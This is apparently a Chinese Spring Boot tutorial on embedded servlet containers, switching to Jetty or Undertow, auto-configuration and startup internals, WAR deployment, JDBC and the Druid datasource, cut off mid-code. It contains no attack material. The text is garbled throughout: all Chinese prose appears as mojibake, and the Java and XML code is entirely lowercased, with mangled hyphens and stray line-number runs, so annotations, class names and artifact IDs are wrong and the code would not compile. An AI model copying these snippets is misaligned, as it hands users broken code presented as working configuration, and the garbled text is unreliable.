ç½®\n\n 1. ä¿®æ¹åserveræå³çéç½®ï¼serverpropertiesãä¹æ¯embeddedservletcontainercustomizerãï¼ã\n\nerver.port=8081\nserver.contextâpath=/crud\nserver.tomcat.uriâencoding=utfâ8\n//éç¨çservletå®¹å¨è®¾ç½®\nserver.xxx\n//tomcatçè®¾ç½®\nserver.tomcat.xxx\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. ç¼åä¸ä¸ªembeddedservletcontainercustomizerï¼åµå¥å¼çservletå®¹å¨çå®å¶å¨ï¼æ¥ä¿®æ¹servletå®¹å¨çéç½®\n\n@bean //ä¸å®è¦å°è¿ä¸ªå®å¶å¨å å¥å°å®¹å¨ä¸­\npublic embeddedservletcontainercustomizer embeddedservletcontainercustomizer(){\n    return new embeddedservletcontainercustomizer() {\n        //å®å¶åµå¥å¼çservletå®¹å¨ç¸å³çè§å\n        @override\n        public void customize(configurableembeddedservletcontainer container) {\n            container.setport(8083);\n        }\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# æ³¨åservletä¸å¤§ç»ä»¶ãservletãfilterãlistenerã\n\nservlet:\n\n//æ³¨åä¸å¤§ç»ä»¶\n@bean\npublic servletregistrationbean myservlet(){\n    servletregistrationbean registrationbean = new servletregistrationbean(new\n                                                                           myservlet(),"/myservlet");\n    return registrationbean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nfilter:\n\n@bean\npublic filterregistrationbean myfilter(){\n    filterregistrationbean registrationbean = new filterregistrationbean();\n    registrationbean.setfilter(new myfilter());\n    registrationbean.seturlpatterns(arrays.aslist("/hello","/myservlet"));\n    return registrationbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlistener:\n\n@bean\npublic servletlistenerregistrationbean mylistener(){\n    servletlistenerregistrationbean<mylistener> registrationbean = new\n        servletlistenerregistrationbean<>(new mylistener());\n    return registrationbean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspringbootå¸®æä»¬èªå¨springmvcçæ¶åï¼èªå¨çæ³¨åspringmvcçåç«¯æ§å¶å¨ãdispatcherservletã\n\ndispatcherservletautoconfigurationï¼\n\n@bean(name = default_dispatcher_servlet_registration_bean_name)\n@conditionalonbean(value = dispatcherservlet.class, name =\n                   default_dispatcher_servlet_bean_name)\npublic servletregistrationbean dispatcherservletregistration(\n    dispatcherservlet dispatcherservlet) {\n    servletregistrationbean registration = new servletregistrationbean(\n        dispatcherservlet, this.serverproperties.getservletmapping());\n    //é»è®¤æ¦æªï¼ / ææè¯·æ±ï¼åéæèµæºï¼ä½æ¯ä¸æ¦æªjspè¯·æ±ï¼ /*ä¼æ¦æªjsp\n    //å¯ä»¥éè¿server.servletpathæ¥ä¿®æ¹springmvcåç«¯æ§å¶å¨é»è®¤æ¦æªçè¯·æ±è·¯å¾\n    registration.setname(default_dispatcher_servlet_bean_name);\n    registration.setloadonstartup(\n        this.webmvcproperties.getservlet().getloadonstartup());\n    if (this.multipartconfig != null) {\n        registration.setmultipartconfig(this.multipartconfig);\n    }\n    return registration;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# æ¿æ¢å¶ä»å®¹å¨\n\ntomcaté»è®¤æ¯æï¼\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâweb</artifactid>\n    å¼å¥webæ¨¡åé»è®¤å°±æ¯ä½¿ç¨åµå¥å¼çtomcatä½ä¸ºservletå®¹å¨ï¼\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\njetty:\n\n<!ââ å¼å¥webæ¨¡å ââ>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâweb</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>springâbootâstarterâtomcat</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!ââå¼å¥å¶ä»çservletå®¹å¨ââ>\n<dependency>\n    <artifactid>springâbootâstarterâjetty</artifactid>\n    <groupid>org.springframework.boot</groupid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nundertowï¼\n\n<!ââ å¼å¥webæ¨¡å ââ>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâweb</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>springâbootâstarterâtomcat</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!ââå¼å¥å¶ä»çservletå®¹å¨ââ>\n<dependency>\n    <artifactid>springâbootâstarterâundertow</artifactid>\n    <groupid>org.springframework.boot</groupid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# èªå¨éç½®åç\n\nembeddedservletcontainerautoconfigurationï¼åµå¥å¼çservletå®¹å¨èªå¨éç½®\n\n@autoconfigureorder(ordered.highest_precedence)\n@configuration\n@conditionalonwebapplication\n@import(beanpostprocessorsregistrar.class)\n//å¯¼å¥beanpostprocessorsregistrarï¼springæ³¨è§£çï¼ç»å®¹å¨ä¸­å¯¼å¥ä¸äºç»ä»¶\n//å¯¼å¥äºembeddedservletcontainercustomizerbeanpostprocessorï¼\n//åç½®å¤çå¨ï¼beanåå§åååï¼åå»ºå®å¯¹è±¡ï¼è¿æ²¡èµå¼èµå¼ï¼æ§è¡åå§åå·¥ä½\npublic class embeddedservletcontainerautoconfiguration {\n    @configuration\n    @conditionalonclass({ servlet.class, tomcat.class })//å¤æ­å½åæ¯å¦å¼å¥äºtomcatä¾èµï¼\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)//å¤æ­å½åå®¹å¨æ²¡æç¨æ·èªå·±å®ä¹embeddedservletcontainerfactoryï¼åµå¥å¼ç\n    servletå®¹å¨å·¥åï¼ä½ç¨ï¼åå»ºåµå¥å¼çservletå®¹å¨\n        public static class embeddedtomcat {\n            @bean\n            public tomcatembeddedservletcontainerfactory tomcatembeddedservletcontainerfactory()\n            {\n                return new tomcatembeddedservletcontainerfactory();\n            }\n        }\n    /**\n* nested configuration if jetty is being used.\n*/\n    @configuration\n    @conditionalonclass({ servlet.class, server.class, loader.class,\n                         webappcontext.class })\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)\n    public static class embeddedjetty {\n        @bean\n        public jettyembeddedservletcontainerfactory jettyembeddedservletcontainerfactory() {\n            return new jettyembeddedservletcontainerfactory();\n        }\n    }\n    /**\n* nested configuration if undertow is being used.\n*/\n    @configuration\n    @conditionalonclass({ servlet.class, undertow.class, sslclientauthmode.class })\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)\n    public static class embeddedundertow {\n        @bean\n        public undertowembeddedservletcontainerfactory\n            undertowembeddedservletcontainerfactory() {\n            return new undertowembeddedservletcontainerfactory();\n        }\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\nembeddedservletcontainerfactoryåµå¥å¼servletå®¹å¨å·¥å\n\npublic interface embeddedservletcontainerfactory {\n    //è·ååµå¥å¼çservletå®¹å¨\n    embeddedservletcontainer getembeddedservletcontainer(\n        servletcontextinitializer... initializers);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n\nåµå¥å¼çå®¹å¨å·¥åï¼\n\n\n\nåµå¥å¼çå®¹å¨ï¼\n\n\n\n@override\npublic embeddedservletcontainer getembeddedservletcontainer(\n    servletcontextinitializer... initializers) {\n    //åå»ºä¸ä¸ªtomcat\n    tomcat tomcat = new tomcat();\n    //éç½®tomcatçåºæ¬ç¯è\n    file basedir = (this.basedirectory != null ? this.basedirectory\n                    : createtempdir("tomcat"));\n    tomcat.setbasedir(basedir.getabsolutepath());\n    connector connector = new connector(this.protocol);\n    tomcat.getservice().addconnector(connector);\n    customizeconnector(connector);\n    tomcat.setconnector(connector);\n    tomcat.gethost().setautodeploy(false);\n    configureengine(tomcat.getengine());\n    for (connector additionalconnector : this.additionaltomcatconnectors) {\n        tomcat.getservice().addconnector(additionalconnector);\n    }\n    preparecontext(tomcat.gethost(), initializers);\n    //å°éç½®å¥½çtomcatä¼ å¥è¿å»ï¼è¿åä¸ä¸ªembeddedservletcontainerï¼å¹¶ä¸å¯å¨tomcatæå¡å¨\n    return gettomcatembeddedservletcontainer(tomcat);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nembeddedservletcontainercustomizerå®å¶å¨å¸®æä»¬ä¿®æ¹äºservletå®¹å¨çéç½®ã\n\nå®¹å¨ä¸­å¯¼å¥äºembeddedservletcontainercustomizerbeanpostprocessorã\n\n//åå§åä¹å\n@override\npublic object postprocessbeforeinitialization(object bean, string beanname)\n    throws beansexception {\n    //å¦æå½ååå§åçæ¯ä¸ä¸ªconfigurableembeddedservletcontainerç±»åçç»ä»¶\n    if (bean instanceof configurableembeddedservletcontainer) {\n        //\n        postprocessbeforeinitialization((configurableembeddedservletcontainer) bean);\n    }\n    return bean;\n}\nprivate void postprocessbeforeinitialization(\n    configurableembeddedservletcontainer bean) {\n    //è·åææçå®å¶å¨ï¼è°ç¨æ¯ä¸ä¸ªå®å¶å¨çcustomizeæ¹æ³æ¥ç»servletå®¹å¨è¿è¡å±æ§èµå¼ï¼\n    for (embeddedservletcontainercustomizer customizer : getcustomizers()) {\n        customizer.customize(bean);\n    }\n}\nprivate collection<embeddedservletcontainercustomizer> getcustomizers() {\n    if (this.customizers == null) {\n        // look up does not include the parent context\n        this.customizers = new arraylist<embeddedservletcontainercustomizer>(\n            this.beanfactory\n            //ä»å®¹å¨ä¸­è·åææè¿èç±»åçç»ä»¶ï¼embeddedservletcontainercustomizer\n            //å®å¶servletå®¹å¨ï¼ç»å®¹å¨ä¸­å¯ä»¥æ·»å ä¸ä¸ªembeddedservletcontainercustomizerç±»åçç»ä»¶\n            .getbeansoftype(embeddedservletcontainercustomizer.class,\n                            false, false)\n            .values());\n        collections.sort(this.customizers, annotationawareordercomparator.instance);\n        this.customizers = collections.unmodifiablelist(this.customizers);\n    }\n    return this.customizers;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n1ï¼ãspringbootæ ¹æ®å¯¼å¥çä¾èµæåµï¼ç»å®¹å¨ä¸­æ·»å ç¸åºç embeddedservletcontainerfactoryãtomcatembeddedservletcontainerfactoryã\n\n2ï¼ãå®¹å¨ä¸­æä¸ªç»ä»¶è¦åå»ºå¯¹è±¡å°±ä¼æå¨åç½®å¤çå¨ãembeddedservletcontainercustomizerbeanpostprocessorãåªè¦æ¯åµå¥å¼çservletå®¹å¨å·¥åï¼åç½®å¤çå¨å°±å·¥ä½ã\n\n3ï¼ãåç½®å¤çå¨ï¼ä»å®¹å¨ä¸­è·åææçembeddedservletcontainercustomizerï¼è°ç¨å®å¶å¨çå®å¶æ¹æ³\n\n\n# åµå¥å¼servletå®¹å¨å¯å¨åç\n\nä»ä¹æ¶ååå»ºåµå¥å¼çservletå®¹å¨å·¥åï¼ä»ä¹æ¶åè·ååµå¥å¼çservletå®¹å¨å¹¶å¯å¨tomcatï¼è·ååµå¥å¼çservletå®¹å¨å·¥åï¼\n\n 1. springbootåºç¨å¯å¨è¿è¡runæ¹æ³\n 2. refreshcontext(context)ãspringbootå·æ°iocå®¹å¨ãåå»ºiocå®¹å¨å¯¹è±¡ï¼å¹¶åå§åå®¹å¨ï¼åå»ºå®¹å¨ä¸­çæ¯ä¸ ä¸ªç»ä»¶ããå¦ææ¯webåºç¨åå»ºannotationconfigembeddedwebapplicationcontextï¼å¦åï¼ annotationconfigapplicationcontext\n 3. refresh(context)ãå·æ°åæåå»ºå¥½çiocå®¹å¨ã\n\npublic void refresh() throws beansexception, illegalstateexception {\n    synchronized (this.startupshutdownmonitor) {\n        // prepare this context for refreshing.\n        preparerefresh();\n        // tell the subclass to refresh the internal bean factory.\n        configurablelistablebeanfactory beanfactory = obtainfreshbeanfactory();\n        // prepare the bean factory for use in this context.\n        preparebeanfactory(beanfactory);\n        try {\n            // allows postâprocessing of the bean factory in context subclasses.\n            postprocessbeanfactory(beanfactory);\n            // invoke factory processors registered as beans in the context.\n            invokebeanfactorypostprocessors(beanfactory);\n            // register bean processors that intercept bean creation.\n            registerbeanpostprocessors(beanfactory);\n            // initialize message source for this context.\n            initmessagesource();\n            // initialize event multicaster for this context.\n            initapplicationeventmulticaster();\n            // initialize other special beans in specific context subclasses.\n            onrefresh();\n            // check for listener beans and register them.\n            registerlisteners();\n            // instantiate all remaining (nonâlazyâinit) singletons.\n            finishbeanfactoryinitialization(beanfactory);\n            // last step: publish corresponding event.\n            finishrefresh();\n        }\n        catch (beansexception ex) {\n            if (logger.iswarnenabled()) {\n                logger.warn("exception encountered during context initialization â " +\n                            "cancelling refresh attempt: " + ex);\n            }\n            // destroy already created singletons to avoid dangling resources.\n            destroybeans();\n            // reset \'active\' flag.\n            cancelrefresh(ex);\n            // propagate exception to caller.\n            throw ex;\n        }\n        finally {\n            // reset common introspection caches in spring\'s core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetcommoncaches();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n 4. onrefresh()ãwebçiocå®¹å¨éåäºonrefreshæ¹æ³\n\n 5. webiocå®¹å¨ä¼åå»ºåµå¥å¼çservletå®¹å¨ãcreateembeddedservletcontainer()ã\n\n 6. è·ååµå¥å¼çservletå®¹å¨å·¥å\n    \n    embeddedservletcontainerfactory containerfactory = getembeddedservletcontainerfactory(); ä»iocå®¹å¨ä¸­è·åembeddedservletcontainerfactoryç»ä»¶ãtomcatembeddedservletcontainerfactoryåå»ºå¯¹è±¡ï¼åç½®å¤çå¨ä¸çæ¯è¿ä¸ªå¯¹è±¡ï¼å°±è·åææçå®å¶å¨æ¥åå®å¶servletå®¹å¨çç¸å³éç½®ã\n\n 7. ä½¿ç¨å®¹å¨å·¥åè·ååµå¥å¼çservletå®¹å¨ï¼this.embeddedservletcontainer = containerfactory .getembeddedservletcontainer(getselfinitializer());\n\n 8. åµå¥å¼çservletå®¹å¨åå»ºå¯¹è±¡å¹¶å¯å¨servletå®¹å¨\n\n 9. åå¯å¨åµå¥å¼çservletå®¹å¨ï¼åå°iocå®¹å¨ä¸­å©ä¸æ²¡æåå»ºåºçå¯¹è±¡è·ååºæ¥ã\n\n\n# ä½¿ç¨å¤ç½®çservletå®¹å¨\n\n 1. å¿é¡»åå»ºä¸ä¸ªwaré¡¹ç®\n\n 2. å°åµå¥å¼çtomcatæå®ä¸ºprovided\n    \n    <dependency>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>springâbootâstarterâtomcat</artifactid>\n        <scope>provided</scope>\n    </dependency>\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. å¿é¡»ç¼åä¸ä¸ªspringbootservletinitializerçå­ç±»ï¼å¹¶è°ç¨configureæ¹æ³\n    \n    public class servletinitializer extends springbootservletinitializer {\n        @override\n        protected springapplicationbuilder configure(springapplicationbuilder application) {\n            //ä¼ å¥springbootåºç¨çä¸»ç¨åº\n            return application.sources(springboot04webjspapplication.class);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. å¯å¨æå¡å¨å°±å¯ä»¥ä½¿ç¨\n\n\n# å¤ç½®servletåç\n\njaråï¼æ§è¡springbootä¸»ç±»çmainæ¹æ³ï¼å¯å¨iocå®¹å¨ï¼åå»ºåµå¥å¼çservletå®¹å¨\n\nwaråï¼å¯å¨æå¡å¨ï¼æå¡å¨å¯å¨springbootåºç¨ãspringbootservletinitializerãï¼å¯å¨iocå®¹å¨\n\nè§åï¼\n\n1ï¼ãæå¡å¨å¯å¨ï¼webåºç¨å¯å¨ï¼ä¼åå»ºå½åwebåºç¨éé¢æ¯ä¸ä¸ªjaråéé¢servletcontainerinitializerå®ä¾\n\n2ï¼ãservletcontainerinitializerçå®ç°æ¾å¨jaråçmeta-inf/servicesæä»¶å¤¹ä¸ï¼æä¸ä¸ªåä¸ºjavax.servlet.servletcontainerinitializerçæä»¶ï¼åå®¹å°±æ¯servletcontainerinitializerçå®ç°ç±»çå¨ç±»å\n\n3ï¼ãè¿å¯ä»¥ä½¿ç¨@handlestypesï¼å¨åºç¨å¯å¨çæ¶åå è½½æä»¬æå´è¶£çç±»ï¼\n\næµç¨ï¼\n\n1ï¼ãå¯å¨tomcat\n\n2ï¼ãorg\\springframework\\spring-web\\4.3.14.release\\spring-web-4.3.14.release.jar!\\metainf\\services\\javax.servlet.servletcontainerinitializerï¼\n\nspringçwebæ¨¡åéé¢æè¿ä¸ªæä»¶ï¼org.springframework.web.springservletcontainerinitializer\n\n3ï¼ã`springservletcontainerinitializer`å°`@handlestypes(webapplicationinitializer.class)`æ æ³¨çææè¿ä¸ªç±»å çç±»é½ä¼ å¥å°onstartupæ¹æ³ç`<set>`ï¼ä¸ºè¿äº`webapplicationinitializer`ç±»åçç±»åå»ºå®ä¾\n\n\n4ï¼ãæ¯ä¸ä¸ªwebapplicationinitializeré½è°ç¨èªå·±çonstartupãç¸å½äºæä»¬çspringbootservletinitializerçç±»ä¼è¢«åå»ºå¯¹è±¡ï¼å¹¶æ§è¡onstartupæ¹æ³ã\n\n6ï¼ãspringbootservletinitializerå®ä¾æ§è¡onstartupçæ¶åä¼createrootapplicationcontextåå»ºå®¹å¨\n\nprotected webapplicationcontext createrootapplicationcontext(\n    servletcontext servletcontext) {\n    //1ãåå»ºspringapplicationbuilder\n    springapplicationbuilder builder = createspringapplicationbuilder();\n    standardservletenvironment environment = new standardservletenvironment();\n    environment.initpropertysources(servletcontext, null);\n    builder.environment(environment);\n    builder.main(getclass());\n    applicationcontext parent = getexistingrootwebapplicationcontext(servletcontext);\n    if (parent != null) {\n        this.logger.info("root context already created (using as parent).");\n        servletcontext.setattribute(\n            webapplicationcontext.root_web_application_context_attribute, null);\n        builder.initializers(new parentcontextapplicationcontextinitializer(parent));\n    }\n    builder.initializers(\n        new servletcontextapplicationcontextinitializer(servletcontext));\n    builder.contextclass(annotationconfigembeddedwebapplicationcontext.class);\n    //è°ç¨configureæ¹æ³ï¼å­ç±»éåäºè¿ä¸ªæ¹æ³ï¼å°springbootçä¸»ç¨åºç±»ä¼ å¥äºè¿æ¥\n    builder = configure(builder);\n    //ä½¿ç¨builderåå»ºä¸ä¸ªspringåºç¨\n    springapplication application = builder.build();\n    if (application.getsources().isempty() && annotationutils\n        .findannotation(getclass(), configuration.class) != null) {\n        application.getsources().add(getclass());\n    }\n    assert.state(!application.getsources().isempty(),\n                 "no springapplication sources have been defined. either override the "\n                 + "configure method or add an @configuration annotation");\n    // ensure error pages are registered\n    if (this.registererrorpagefilter) {\n        application.getsources().add(errorpagefilterconfiguration.class);\n    }\n    //å¯å¨springåºç¨\n    return run(application);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n7ï¼ãspringçåºç¨å°±å¯å¨å¹¶ä¸åå»ºiocå®¹å¨\n\npublic configurableapplicationcontext run(string... args) {\n    stopwatch stopwatch = new stopwatch();\n    stopwatch.start();\n    configurableapplicationcontext context = null;\n    failureanalyzers analyzers = null;\n    configureheadlessproperty();\n    springapplicationrunlisteners listeners = getrunlisteners(args);\n    listeners.starting();\n    try {\n        applicationarguments applicationarguments = new defaultapplicationarguments(\n            args);\n        configurableenvironment environment = prepareenvironment(listeners,\n                                                                 applicationarguments);\n        banner printedbanner = printbanner(environment);\n        context = createapplicationcontext();\n        analyzers = new failureanalyzers(context);\n        preparecontext(context, environment, listeners, applicationarguments,\n                       printedbanner);\n        //å·æ°iocå®¹å¨\n        refreshcontext(context);\n        afterrefresh(context, applicationarguments);\n        listeners.finished(context, null);\n        stopwatch.stop();\n        if (this.logstartupinfo) {\n            new startupinfologger(this.mainapplicationclass)\n                .logstarted(getapplicationlog(), stopwatch);\n        }\n        return context;\n    }\n    catch (throwable ex) {\n        handlerunfailure(context, listeners, analyzers, ex);\n        throw new illegalstateexception(ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# springbootæ°æ®äº¤äº\n\n\n# jdbc\n\næ·»å ä¾èµï¼\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-jdbc</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néç½®éç½®æä»¶\n\n# æ­¤å¤å¦æåæ¢ä¸ºé«çæ¬çmysqlé©±å¨ éè¦æ´æ¢ä¸ºcjä¸çdriver\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver  \n\n# å¦æå ä¸ºé©±å¨çæ¬å°äºæ°æ®åºççæ¬å¯è½ä¼å¯¼è´è¿æ¥é®é¢ãå ä¸åæ°usessl=falseå¯ä»¥è§£å³ï¼å»ºè®®æ´æ¢çæ¬ã\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ·»å æµè¯ä¾èµï¼\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-test</artifactid>\n  <scope>test</scope>\n  </dependency>\n\n\n1\n2\n3\n4\n5\n\n\néç½®å¯å¨å¨ï¼å¦æä¸éç½®ï¼æµè¯å¯å¨ä¼æ¥éã\n\npackage com.pwddd.jdbc;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\n\n@springbootapplication\npublic class jdbcapplication {\n  public static void main(string[] args) {\n    springapplication.run(jdbcapplication.class,args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næµè¯ï¼\n\nimport com.pwddd.jdbc.jdbcapplication;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.test.context.springboottest;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springrunner;\n\nimport javax.sql.datasource;\nimport java.sql.sqlexception;\n\n@runwith(springrunner.class)\n@springboottest(classes = {jdbcapplication.class})  // æ­¤å¤å¦æä¸æå®class,ä¸å½åæµè¯ç±»çè·¯å¾åå¯å¨ç±»çè·¯å¾ä¸ä¸è´ï¼åæ¾ä¸å°å¯å¨ç±»æ¥éãhttps://blog.csdn.net/pmdream/article/details/109119689\npublic class testjdbc {\n\n  @autowired\n  jdbctemplate jdbctemplate;\n\n  @autowired\n  datasource datasource;\n\n  @test\n  public void test() throws sqlexception {\n    system.out.println(datasource.getconnection());\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ°æ®äº¤äºéç½®åç\n\nå¨springbootä¸­é»è®¤ä½¿ç¨org.apache.tomcat.jdbc.pool.datasourceä½ä¸ºæ°æ®æºãæ°æ®æºçç¸å³éç½®å¨datasourcepropertiesä¸­ãå¨org.springframework.boot.autoconfigure.jdbc.datasourceconfigurationæ ¹æ®æ¡ä»¶ç»å®¹å¨ä¸­æ·»å äºå¤ç§æ°æ®æºãå¯ä»¥ä½¿ç¨spring.datasource.typeéç½®è¦ä½¿ç¨çæ°æ®æºãå¦ä¸é¢çä»£ç æç¤º\n\n@conditionalonclass({org.apache.tomcat.jdbc.pool.datasource.class})\n@conditionalonproperty(\n  name = {"spring.datasource.type"},\n  havingvalue = "org.apache.tomcat.jdbc.pool.datasource",\n  matchifmissing = true\n)\nstatic class tomcat extends datasourceconfiguration {\n  tomcat() {\n  }\n\n  @bean\n  @configurationproperties(\n    prefix = "spring.datasource.tomcat"\n  )\n  public org.apache.tomcat.jdbc.pool.datasource datasource(datasourceproperties properties) {\n    org.apache.tomcat.jdbc.pool.datasource datasource = (org.apache.tomcat.jdbc.pool.datasource)this.createdatasource(properties, org.apache.tomcat.jdbc.pool.datasource.class);\n    databasedriver databasedriver = databasedriver.fromjdbcurl(properties.determineurl());\n    string validationquery = databasedriver.getvalidationquery();\n    if (validationquery != null) {\n      datasource.settestonborrow(true);\n      datasource.setvalidationquery(validationquery);\n    }\n\n    return datasource;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\né¤æ­¤ä¹å¤ï¼å¨org.springframework.boot.autoconfigure.jdbc.datasourceinitializerä¸­å®ä¹äºå¨ç¨åºè¿è¡æ¶è¿è¡çæ°æ®æä½ï¼è¿è¡å»ºè¡¨è¯­å¥ååå»ºæ°æ®åºçè¯­å¥ãsqlè¯­å¥ä½äºclasspathä¸çschema/data-all.sqlæèschema/data.sqlï¼ä¹å¯ä»¥æå®spring.datasource.data/schema\n\nlist<resource> scripts = this.getscripts("spring.datasource.data", this.properties.getdata(), "data");\nlist<resource> scripts = this.getscripts("spring.datasource.schema", this.properties.getschema(), "schema");\nprivate list<resource> getscripts(string propertyname, list<string> resources, string fallback) {\n  if (resources != null) {\n    return this.getresources(propertyname, resources, true);\n  } else {\n    string platform = this.properties.getplatform();\n    list<string> fallbackresources = new arraylist();\n    fallbackresources.add("classpath*:" + fallback + "-" + platform + ".sql");\n    fallbackresources.add("classpath*:" + fallback + ".sql");\n    return this.getresources(propertyname, fallbackresources, false);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå¦ä¸æç¤ºï¼\n\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n\n1\n2\n\n\nspringbooté»è®¤éç½®äºä¸ä¸ªjdbctemplateæ°æ®æº\n\n@test\npublic void testjdbctemplate(){\n  list<map<string, object>> maps = jdbctemplate.queryforlist("select * from t_admin");\n  system.out.println(maps.get(0));\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# druidæ°æ®æº\n\nå¼å¥druidæ°æ®æº\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n  <version>1.2.8</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\næå®æ°æ®æºçç±»åï¼\n\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\n\n\n1\n\n\néç½®æä»¶ä¸­éç½®ç¸å³çåæ°ï¼\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# druidéç½®\nspring.datasource.initialsize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=select 1 from dual\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergesql=true;druid.stat.slowsqlmillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nç´æ¥è¿ä¹éç½®æ²¡æåæ³æ³¨å¥å°åæ°ä¸­ï¼æä»¬éè¦èªå®ä¹druidçéç½®ç±»ï¼ç¶åæå®éç½®æä»¶çåç¼\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\n\n@configuration\npublic class druidconfig {\n\n  @configurationproperties(prefix = "spring.datasource.druid")\n  @bean\n  public datasource druiddatasource(){\n    return new druiddatasource();\n  